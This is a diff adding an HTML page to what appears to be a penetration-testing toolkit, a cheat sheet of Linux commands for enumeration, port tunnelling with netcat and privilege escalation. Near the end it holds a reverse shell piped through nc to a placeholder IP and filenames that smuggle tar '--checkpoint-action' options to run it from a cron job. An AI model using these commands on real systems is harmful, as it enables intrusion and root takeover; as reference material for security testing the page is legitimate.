@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>渗透平台 - C1O2A3</title>
+  <link rel="stylesheet" href="./src/css/layui.css">
+<style type="text/css">
+.layui-layout-admin .layui-body {
+    position: fixed;
+    top: 60px;
+    bottom: 44px;
+}
+.myselect {
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding: 30px;
+  margin-top: 15px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+}
+.myinput{
+  width: 90%;
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding: 30px;
+  margin-top: 15px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+}
+.mymd5{
+  margin-top: 15px;
+  /*padding-top: 66px;*/
+}
+.myinput:hover {
+    border-bottom-color:  #c51152;
+    -webkit-box-shadow: 0 3px 0 0 #c51152;
+    box-shadow: 0 3px 0 0 #c51152;
+}
+.myinput:focus {
+    border-bottom-color:  #33ccff;
+    -webkit-box-shadow: 0 3px 0 0 #33ccff;
+    box-shadow: 0 3px 0 0 #33ccff;
+}
+</style>
+</head>
+<body class="layui-layout-body">
+<div class="layui-layout layui-layout-admin">
+  <div class="layui-header layui-bg-blue">
+    <div class="layui-logo">渗透平台</div>
+
+    <!-- 头部区域（可配合layui已有的水平导航） -->
+    <ul class="layui-nav layui-layout-left">
+ <!--      <li class="layui-nav-item"><a href="">控制台</a></li>
+      <li class="layui-nav-item"><a href="">商品管理</a></li>
+      <li class="layui-nav-item"><a href="">用户</a></li> -->
+<!--       <li class="layui-nav-item">
+        <a href="javascript:;">其它系统</a>
+        <dl class="layui-nav-child">
+          <dd><a href="">邮件管理</a></dd>
+          <dd><a href="">消息管理</a></dd>
+          <dd><a href="">授权管理</a></dd>
+        </dl>
+      </li> -->
+    </ul>
+    <ul class="layui-nav layui-layout-right layui-bg-blue">
+      <li class="layui-nav-item">
+        <a href="javascript:;">
+          <img src="./src/img/test.jpg" class="layui-nav-img">
+          c1o2a3
+        </a>
+        <!-- <dl class="layui-nav-child"> -->
+<!--           <dd><a href="">基本资料</a></dd>
+          <dd><a href="">安全设置</a></dd> -->
+        <!-- </dl> -->
+      </li>
+      <!-- <li class="layui-nav-item"><a href="">退了</a></li> -->
+    </ul>
+  </div>
+  
+  <div class="layui-side layui-bg-blue">
+    <div class="layui-side-scroll">
+      <!-- 左侧导航区域（可配合layui已有的垂直导航） -->
+      <ul class="layui-nav layui-nav-tree layui-bg-blue"  lay-filter="test">
+        <li class="layui-nav-item">
+          <a class="" href="javascript:;">前端工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./decode.html">编码解码</a></dd>
+            <dd><a href="./qrcode.html">二维码生成</a></dd>
+            <!-- <dd><a href="./codebeautify.html">代码美化</a></dd> -->
+            <dd><a href="./passwd.html">随机密码生成器</a></dd>
+            <dd><a href="./idcard.html">身份证号码生成</a></dd>
+          </dl>
+        </li>
+        <li class="layui-nav-item">
+          <a href="javascript:;">安全工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./googlehacking.html">google hacking</a></dd>
+            <dd><a href="./search.html">综合搜索</a></dd>
+            <dd><a href="./getAV.html">Windows杀软识别</a></dd>
+            <dd><a href="./tiquan.html">Windows提权辅助</a></dd>
+            <dd><a href="./shell.html">反弹shell编码</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+        <li class="layui-nav-item layui-nav-itemed">
+          <a href="javascript:;">常用资料</a>
+          <dl class="layui-nav-child">
+            <dd class="layui-this"><a href="./linux.html">Linux常用命令</a></dd>
+            <dd><a href="./windows.html">windows常用命令</a></dd>
+            <dd><a href="./powershell.html">powershell常用命令</a></dd>
+            <dd><a href="./down.html">传输方法常用命令</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+<!--         <li class="layui-nav-item"><a href="">云市场</a></li>
+        <li class="layui-nav-item"><a href="">发布商品</a></li> -->
+      </ul>
+    </div>
+  </div>
+  
+  <div class="layui-body ">
+    <!-- 内容主体区域 -->
+    <div class="layui-collapse" lay-accordion="" style="padding: 15px; ">
+      <center>  <h1>Linux常用命令</h1></center>
+      <hr class="layui-border-blue">
+      <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+        <legend>一些有用的命令</legend>
+      </fieldset>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">SUID</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>find / -user root -perm /4000 2>/dev/null</li>
+              <li>find / -perm -u=s -type f 2>/dev/null</li>
+              <li>find / -type f -name '*.txt' 2>/dev/null</li>
+              <li>find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看系统版本</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>cat /etc/issue</li>
+              <li>cat /etc/*-release</li>
+              <li>cat /etc/lsb-release</li>
+              <li>cat /etc/redhat-release</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看内核版本</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>cat /proc/version</li>
+              <li>uname -a</li>
+              <li>uname -mrs</li>
+              <li>rpm -q kernel</li>
+              <li>dmesg | grep Linux</li>
+              <li>ls /boot | grep vmlinuz</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看环境变量</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>cat /etc/profile</li>
+              <li>cat /etc/bashrc</li>
+              <li>cat ~/.bash_profile</li>
+              <li>cat ~/.bashrc</li>
+              <li>cat ~/.bash_logout</li>
+              <li>env</li>
+              <li>set</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看cron</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>crontab -l</li>
+              <li>ls -alh /var/spool/cron</li>
+              <li>ls -al /etc/ | grep cron</li>
+              <li>ls -al /etc/cron*</li>
+              <li>cat /etc/cron*</li>
+              <li>cat /etc/at.allow</li>
+              <li>cat /etc/at.deny</li>
+              <li>cat /etc/cron.allow</li>
+              <li>cat /etc/cron.deny</li>
+              <li>cat /etc/crontab</li>
+              <li>cat /etc/anacrontab</li>
+              <li>cat /var/spool/cron/crontabs/root</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看服务设置</h2>
+          <div class="layui-colla-content">
+			<ul>
+				<li>cat /etc/syslog.conf</li>
+				<li>cat /etc/chttp.conf</li>
+				<li>cat /etc/lighttpd.conf</li>
+				<li>cat /etc/cups/cupsd.conf</li>
+				<li>cat /etc/inetd.conf</li>
+				<li>cat /etc/apache2/apache2.conf</li>
+				<li>cat /etc/my.conf</li>
+				<li>cat /etc/httpd/conf/httpd.conf</li>
+				<li>cat /opt/lampp/etc/httpd.conf</li>
+				<li>ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/</li>
+			</ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">查看其他用户与系统通信</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>lsof -i</li>
+              <li>lsof -i :80</li>
+              <li>grep 80 /etc/services</li>
+              <li>netstat -antup</li>
+              <li>netstat -antpx</li>
+              <li>netstat -tulpn</li>
+              <li>chkconfig --list</li>
+              <li>chkconfig --list | grep 3:on</li>
+              <li>last</li>
+              <li>lastlog</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">端口隧道</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b># FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</b></li>
+              <li>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</li>
+              <li><b># ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</b></li>
+              <li>ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port</li>
+              <li>ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port</li>
+              <li><b># mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe</b></li>
+              <li>mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay</li>
+              <li>mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe <b># Proxy (Port 80 to 8080)</b></li>
+              <li>backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc</li>
+              <li>localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)</li>
+            </ul>
+          </div>
+        </div>
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">tar cronjob 通配符提权</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh</li>
+              <li>touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"</li>
+              <li>touch "/var/www/html/--checkpoint=1"</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+
+    </div>
+  </div>
+  <div class="layui-footer">
+    <!-- 底部固定区域 -->
+    © C1O2A3
+  </div>
+</div>
+<script src="./src/layui.js"></script>
+<script>
+//JavaScript代码区域
+layui.use(['form','element','layer'], function(){
+  var $ = layui.jquery;
+  element = layui.element;
+  layer = layui.layer;
+  form = layui.form;
+  
+});
+</script>
+</body>
+</html>
+      
